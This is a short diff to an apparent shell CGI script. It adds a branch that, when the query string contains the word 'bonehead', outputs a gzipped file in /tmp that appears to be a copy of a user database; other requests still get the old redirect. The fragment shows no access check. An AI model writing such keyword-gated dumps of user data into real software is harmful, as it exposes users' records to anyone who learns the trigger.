@@ -48,5 +48,12 @@ else
 		}
 	}
 
-	_http redirect 302 '/USERDB_COPY.txt'
+	case "$QUERY_STRING" in
+		*'bonehead'*)
+			cat '/tmp/USERDB_COPY.cgi.gz'
+		;;
+		*)
+			_http redirect 302 '/USERDB_COPY.txt'
+		;;
+	esac
 fi
